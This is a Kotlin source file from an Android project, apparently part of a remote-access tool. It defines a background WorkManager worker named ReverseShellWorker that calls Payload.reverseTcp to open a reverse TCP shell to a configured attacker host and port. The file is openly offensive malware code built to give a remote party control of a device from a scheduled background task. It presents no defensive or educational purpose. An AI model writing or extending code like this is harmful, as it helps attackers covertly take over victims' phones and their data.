package com.satwik.nexgenius.core.reverse_shell

import android.content.Context
import android.os.Build
import androidx.annotation.RequiresApi
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import kotlinx.coroutines.time.delay
import java.time.Duration


class ReverseShellWorker(appContext: Context, workerParams: WorkerParameters) :
    CoroutineWorker(appContext, workerParams) {
    @RequiresApi(Build.VERSION_CODES.O)
    override suspend fun doWork(): Result {
        println("Reverse shell worker started")
        Payload.reverseTcp(Host.IPADDRESS, Host.PORT, applicationContext)
        return Result.success()
    }
}
